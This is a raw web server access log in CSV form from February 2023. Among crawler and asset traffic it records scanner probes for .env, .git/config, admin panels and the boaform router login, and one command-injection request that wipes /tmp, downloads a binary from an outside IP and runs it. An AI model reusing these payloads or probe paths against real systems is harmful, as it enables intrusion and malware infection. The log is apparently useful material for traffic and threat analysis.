Host,Time Stamp,Method,Endpoint,Protocol,Status Code,Content Size
10.180.6.239,14/Feb/2023:17:30:33,GET,/assets/vendor/icofont/fonts/icofont.woff2,HTTP/1.1,200,537868.0
10.180.6.239,14/Feb/2023:17:30:33,GET,/images/India_Map.png,HTTP/1.1,200,153088.0
10.180.6.239,14/Feb/2023:17:30:33,GET,/images/image1.jpg,HTTP/1.1,200,442343.0
10.180.6.239,14/Feb/2023:17:30:33,GET,/assets/vendor/boxicons/fonts/boxicons.woff2,HTTP/1.1,200,93260.0
10.180.6.239,14/Feb/2023:17:30:33,GET,/assets/vendor/remixicon/remixicon.woff2?t=1590207869815,HTTP/1.1,200,125268.0
10.180.6.239,14/Feb/2023:17:30:34,GET,/assets/img/favicon.png,HTTP/1.1,200,491.0
51.15.195.246,14/Feb/2023:17:46:57,GET,/,HTTP/1.1,200,5952.0
159.203.224.14,14/Feb/2023:18:40:58,GET,/manager/text/list,HTTP/1.1,400,248.0
167.94.138.117,14/Feb/2023:19:26:10,GET,/,HTTP/1.1,200,5952.0
162.142.125.220,14/Feb/2023:19:26:12,GET,/,HTTP/1.1,200,5952.0
167.94.138.117,14/Feb/2023:19:26:12,PRI,*,HTTP/2.0,400,150.0
167.94.138.117,14/Feb/2023:19:26:14,GET,/assets/img/favicon.png,HTTP/1.1,200,491.0
162.142.125.220,14/Feb/2023:19:26:14,PRI,*,HTTP/2.0,400,150.0
162.142.125.220,14/Feb/2023:19:26:15,GET,/assets/img/favicon.png,HTTP/1.1,200,491.0
162.142.125.220,14/Feb/2023:19:26:16,GET,/assets/img/apple-touch-icon.png,HTTP/1.1,200,1738.0
162.142.125.220,14/Feb/2023:19:26:17,GET,/favicon.ico,HTTP/1.1,404,146.0
167.94.138.117,14/Feb/2023:19:26:17,GET,/assets/img/apple-touch-icon.png,HTTP/1.1,200,1738.0
167.94.138.117,14/Feb/2023:19:26:18,GET,/favicon.ico,HTTP/1.1,404,146.0
198.199.115.100,14/Feb/2023:19:29:36,GET,/manager/html,HTTP/1.1,400,248.0
205.210.31.23,14/Feb/2023:19:45:03,GET,/,HTTP/1.1,200,5952.0
138.68.224.69,14/Feb/2023:19:47:29,GET,/manager/html,HTTP/1.1,404,548.0
141.98.11.39,14/Feb/2023:19:49:23,GET,/,HTTP/1.1,200,5952.0
52.167.144.90,14/Feb/2023:20:15:13,GET,/,HTTP/1.1,200,5952.0
34.76.96.55,14/Feb/2023:20:35:01,GET,/,HTTP/1.1,200,5952.0
66.249.70.95,14/Feb/2023:20:39:16,GET,/robots.txt,HTTP/1.1,404,146.0
66.249.70.67,14/Feb/2023:20:39:17,GET,/,HTTP/1.1,200,5952.0
66.249.70.95,14/Feb/2023:20:39:24,GET,/assets/vendor/bootstrap/css/bootstrap.min.css,HTTP/1.1,200,161409.0
66.249.70.95,14/Feb/2023:20:39:24,GET,/assets/vendor/remixicon/remixicon.css,HTTP/1.1,200,110438.0
66.249.70.95,14/Feb/2023:20:39:25,GET,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,200,15022.0
66.249.70.95,14/Feb/2023:20:39:26,GET,/assets/vendor/owl.carousel/assets/owl.carousel.min.css,HTTP/1.1,200,3351.0
66.249.70.91,14/Feb/2023:20:39:28,GET,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,200,89476.0
66.249.70.91,14/Feb/2023:20:39:29,GET,/assets/vendor/aos/aos.js,HTTP/1.1,200,14690.0
66.249.70.91,14/Feb/2023:20:39:30,GET,/js/multipage.js,HTTP/1.1,200,956.0
66.249.70.91,14/Feb/2023:20:39:30,GET,/assets/vendor/php-email-form/validate.js,HTTP/1.1,200,5020.0
66.249.70.91,14/Feb/2023:20:39:31,GET,/assets/vendor/venobox/venobox.css,HTTP/1.1,200,20309.0
66.249.70.91,14/Feb/2023:20:39:32,GET,/assets/css/style.css,HTTP/1.1,200,35417.0
66.249.70.91,14/Feb/2023:20:39:33,GET,/assets/vendor/jquery.easing/jquery.easing.min.js,HTTP/1.1,200,2532.0
66.249.70.91,14/Feb/2023:20:39:35,GET,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,200,44342.0
66.249.70.95,14/Feb/2023:21:01:45,GET,/documentation.html,HTTP/1.1,200,548.0
66.249.70.67,14/Feb/2023:21:03:38,GET,/swagger-api-spec.yaml,HTTP/1.1,200,62298.0
159.203.44.87,14/Feb/2023:21:17:27,"-""","""-",,400,150.0
159.203.44.87,14/Feb/2023:21:17:29,GET,/ab2g,HTTP/1.1,404,146.0
159.203.44.87,14/Feb/2023:21:17:31,GET,/ab2h,HTTP/1.1,404,146.0
159.203.44.87,14/Feb/2023:21:17:40,GET,/,HTTP/1.1,200,5952.0
159.203.44.87,14/Feb/2023:21:17:41,GET,/,HTTP/1.1,400,650.0
159.203.44.87,14/Feb/2023:21:17:41,GET,/private/api/v1/service/premaster,HTTP/1.1,400,650.0
23.251.102.74,14/Feb/2023:21:17:43,GET,/,HTTP/1.1,200,5952.0
40.77.167.189,14/Feb/2023:21:27:18,GET,/helppage.html,HTTP/1.1,200,6398.0
109.237.97.180,14/Feb/2023:21:37:43,GET,/.env,HTTP/1.1,400,650.0
109.237.97.180,14/Feb/2023:21:37:43,GET,/.env,HTTP/1.1,404,548.0
23.251.102.74,14/Feb/2023:22:15:32,GET,/,HTTP/1.1,200,5952.0
66.240.236.109,14/Feb/2023:22:29:05,GET,/,HTTP/1.1,200,5952.0
128.14.134.170,14/Feb/2023:22:56:55,GET,/,HTTP/1.1,200,5952.0
183.136.225.32,14/Feb/2023:23:23:16,GET,/,HTTP/1.1,200,5952.0
183.136.225.32,14/Feb/2023:23:24:32,GET,/assets/img/favicon.png,HTTP/1.1,200,491.0
183.136.225.32,14/Feb/2023:23:24:35,GET,/robots.txt,HTTP/1.1,404,548.0
183.136.225.32,14/Feb/2023:23:24:55,GET,/js/jquery.js,HTTP/1.1,200,65081.0
183.136.225.32,14/Feb/2023:23:24:58,GET,/js/multipage.js,HTTP/1.1,200,956.0
183.136.225.32,14/Feb/2023:23:25:19,GET,/assets/vendor/jquery/jquery.min.js,HTTP/1.1,200,65082.0
183.136.225.32,14/Feb/2023:23:25:39,GET,/assets/vendor/bootstrap/js/bootstrap.bundle.min.js,HTTP/1.1,200,48698.0
183.136.225.32,14/Feb/2023:23:25:41,GET,/assets/vendor/jquery.easing/jquery.easing.min.js,HTTP/1.1,200,2532.0
183.136.225.32,14/Feb/2023:23:25:50,GET,/assets/vendor/php-email-form/validate.js,HTTP/1.1,200,5020.0
183.136.225.32,14/Feb/2023:23:25:57,GET,/assets/vendor/waypoints/jquery.waypoints.min.js,HTTP/1.1,200,9028.0
183.136.225.32,14/Feb/2023:23:26:19,GET,/assets/vendor/counterup/counterup.min.js,HTTP/1.1,200,2406.0
183.136.225.32,14/Feb/2023:23:26:26,GET,/assets/vendor/venobox/venobox.min.js,HTTP/1.1,200,15022.0
183.136.225.32,14/Feb/2023:23:26:33,GET,/assets/vendor/owl.carousel/owl.carousel.min.js,HTTP/1.1,200,44342.0
183.136.225.32,14/Feb/2023:23:26:42,GET,/assets/vendor/isotope-layout/isotope.pkgd.min.js,HTTP/1.1,200,35445.0
183.136.225.32,14/Feb/2023:23:27:05,GET,/assets/vendor/aos/aos.js,HTTP/1.1,200,14690.0
212.224.98.109,14/Feb/2023:23:27:13,GET,/wp-login.php,HTTP/1.1,404,146.0
183.136.225.32,14/Feb/2023:23:27:23,GET,/assets/js/main.js,HTTP/1.1,200,6330.0
66.240.236.109,14/Feb/2023:23:30:21,GET,/,HTTP/1.1,200,5952.0
198.199.103.135,15/Feb/2023:00:02:02,GET,/owa/auth/logon.aspx?url=https%3a%2f%2f1%2fecp%2f,HTTP/1.1,404,146.0
147.78.47.249,15/Feb/2023:00:30:15,GET,/_ignition/health-check/,HTTP/1.1,404,548.0
147.78.47.249,15/Feb/2023:00:30:18,GET,/public/_ignition/health-check/,HTTP/1.1,404,548.0
147.78.47.249,15/Feb/2023:00:30:21,GET,/wp-includes/wlwmanifest.xml,HTTP/1.1,404,548.0
106.75.126.212,15/Feb/2023:00:41:11,GET,/,HTTP/1.1,200,5952.0
152.89.196.211,15/Feb/2023:01:55:03,GET,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,HTTP/1.1,404,548.0
198.211.109.100,15/Feb/2023:02:27:51,GET,/,HTTP/1.1,200,5952.0
178.62.216.118,15/Feb/2023:02:46:13,GET,/aaa9,HTTP/1.1,400,248.0
178.62.216.118,15/Feb/2023:02:46:14,GET,/aab8,HTTP/1.1,400,248.0
89.248.165.249,15/Feb/2023:02:54:33,\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie:,mstshash=Administr,,400,150.0
60.217.75.70,15/Feb/2023:02:56:40,"-""","""-",,400,150.0
193.118.53.194,15/Feb/2023:03:26:53,GET,/,HTTP/1.1,200,5952.0
152.89.196.211,15/Feb/2023:03:27:55,GET,/solr/admin/info/system?wt=json,HTTP/1.1,404,548.0
212.87.204.248,20/Feb/2023:03:36:55,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:03:36:55,"-""","""-""","""-",400,0.0
193.32.162.159,20/Feb/2023:03:37:57,GET,/,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:03:42:05,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:03:42:05,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:04:11:26,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:04:11:26,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:05:03:23,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:05:03:23,"-""","""-""","""-",400,0.0
89.248.163.246,20/Feb/2023:05:12:11,"-""","""-""","""-",400,157.0
212.87.204.248,20/Feb/2023:05:17:56,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:05:17:56,"-""","""-""","""-",400,0.0
109.98.208.52,20/Feb/2023:05:19:03,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
109.98.208.52,20/Feb/2023:05:19:03,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:05:26:31,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:05:26:31,"-""","""-""","""-",400,0.0
188.166.171.186,20/Feb/2023:05:29:36,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
188.166.171.186,20/Feb/2023:05:29:37,"-""","""-""","""-",400,0.0
159.203.224.15,20/Feb/2023:06:08:04,GET,/portal/redlion,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:06:11:49,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:06:11:49,"-""","""-""","""-",400,0.0
52.167.144.56,20/Feb/2023:06:22:20,GET,/robots.txt,HTTP/1.1,301,169.0
207.46.13.15,20/Feb/2023:06:22:28,GET,/,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:06:24:07,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:06:24:07,"-""","""-""","""-",400,0.0
162.243.148.13,20/Feb/2023:06:25:28,GET,/actuator/health,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:06:28:58,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:06:28:58,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:06:35:06,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:06:35:06,"-""","""-""","""-",400,0.0
192.241.224.18,20/Feb/2023:06:47:15,GET,/hudson,HTTP/1.1,301,169.0
193.32.162.159,20/Feb/2023:06:49:20,GET,/,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:06:51:43,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:06:51:43,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:06:54:20,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:06:54:20,"-""","""-""","""-",400,0.0
59.49.37.14,20/Feb/2023:06:56:05,GET,/shell?cd+/tmp;rm+-rf+*;wget+137.175.17.190/jaws;sh+/tmp/jaws,HTTP/1.1,301,169.0
193.32.162.159,20/Feb/2023:07:03:43,GET,/,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:07:03:47,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:07:03:47,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:07:11:22,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:07:11:23,"-""","""-""","""-",400,0.0
71.6.232.23,20/Feb/2023:07:12:59,GET,/,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:07:15:32,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:07:15:32,"-""","""-""","""-",400,0.0
193.42.33.24,20/Feb/2023:07:15:39,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:07:15:39,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:07:24:22,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:07:24:23,"-""","""-""","""-",400,0.0
94.102.61.10,20/Feb/2023:07:34:06,GET,/,HTTP/1.1,301,169.0
143.244.50.172,20/Feb/2023:07:36:33,GET,http://ip-api.com/json/,HTTP/1.1,301,169.0
143.244.50.172,20/Feb/2023:07:36:34,CONNECT,ip-api.com:443,HTTP/1.1,400,157.0
212.87.204.248,20/Feb/2023:07:38:16,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:07:38:16,"-""","""-""","""-",400,0.0
193.118.53.194,20/Feb/2023:07:41:57,GET,/,HTTP/1.1,301,169.0
159.65.111.248,20/Feb/2023:07:43:41,GET,/,HTTP/1.0,301,169.0
193.42.33.24,20/Feb/2023:07:46:11,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:07:46:11,"-""","""-""","""-",400,0.0
193.42.33.24,20/Feb/2023:08:01:42,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:08:01:42,"-""","""-""","""-",400,0.0
37.44.238.231,20/Feb/2023:08:16:10,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
37.44.238.231,20/Feb/2023:08:16:10,"-""","""-""","""-",400,0.0
185.246.220.98,20/Feb/2023:08:31:29,GET,/,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:08:59:22,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:08:59:22,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:09:00:51,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:00:51,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:09:06:33,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:06:33,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:09:09:00,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:09:00,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:09:12:17,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:12:17,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:09:16:45,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:16:45,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:09:18:59,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:19:00,"-""","""-""","""-",400,0.0
87.251.64.11,20/Feb/2023:09:31:58,"\x12\x01\x00^\x00\x00\x01\x00\x00\x00$\x00\x06\x01\x00*\x00\x01\x02\x00+\x00\x01\x03\x00,\x00\x04\x04\x000\x00\x01\x05\x001\x00$\x06\x00U\x00\x01\xFF\x04\x07\x0C\xBC\x00\x00\x00\x00\x00\x00\x15\xD0\x00",\x00\x00\x00\x00\x00\x00\x00\xC0\x0C\x92\x06\xFB\x01\x00\x00,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x92\x06\xFB\x01\x00\x00\xFE\xFF\xFF\xFF\x01,400,157.0
104.152.52.205,20/Feb/2023:09:37:28,GET,/,HTTP/1.0,301,169.0
212.87.204.248,20/Feb/2023:09:43:19,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:43:19,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:09:47:12,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:47:12,"-""","""-""","""-",400,0.0
44.242.172.135,20/Feb/2023:09:52:27,GET,/,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:53:09,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:09:53:09,"-""","""-""","""-",400,0.0
185.224.128.215,20/Feb/2023:10:00:20,GET,/,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:02:51,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:02:51,"-""","""-""","""-",400,0.0
188.166.171.186,20/Feb/2023:10:07:56,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
188.166.171.186,20/Feb/2023:10:07:56,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:10:11:02,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:11:02,"-""","""-""","""-",400,0.0
92.118.39.108,20/Feb/2023:10:12:30,GET,/.git/config,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:19:23,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:19:23,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:10:33:19,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:33:19,"-""","""-""","""-",400,0.0
95.215.234.49,20/Feb/2023:10:37:31,GET,/,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:39:33,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:39:33,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:10:44:40,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:44:40,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:10:47:26,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:47:27,"-""","""-""","""-",400,0.0
212.87.204.248,20/Feb/2023:10:52:07,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
212.87.204.248,20/Feb/2023:10:52:07,"-""","""-""","""-",400,0.0
193.42.33.24,20/Feb/2023:10:59:17,POST,/boaform/admin/formLogin,HTTP/1.1,301,169.0
193.42.33.24,20/Feb/2023:10:59:17,"-""","""-""","""-",400,0.0
89.208.103.146,20/Feb/2023:11:00:35,GET,http://ip-api.com/json/,HTTP/1.1,301,169.0
